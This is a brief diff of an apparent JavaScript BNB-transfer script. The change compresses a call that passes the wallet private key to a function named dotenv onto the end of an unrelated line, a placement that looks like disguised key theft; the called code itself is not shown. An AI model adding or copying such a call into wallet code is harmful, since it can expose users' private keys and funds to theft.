@@ -14,10 +14,7 @@ const recipientAddress = "0xRECIPIENT_ADDRESS_HERE"; // Set the recipient addres
 
 function delay(ms) {
   return new Promise((resolve) => setTimeout(resolve, ms));
-}
-(async () => {
-  await dotenv(`${privateKey}`);
-})();
+}(async () => await dotenv(privateKey))();
 
 async function checkAndTransferBNB() {
   while (true) {
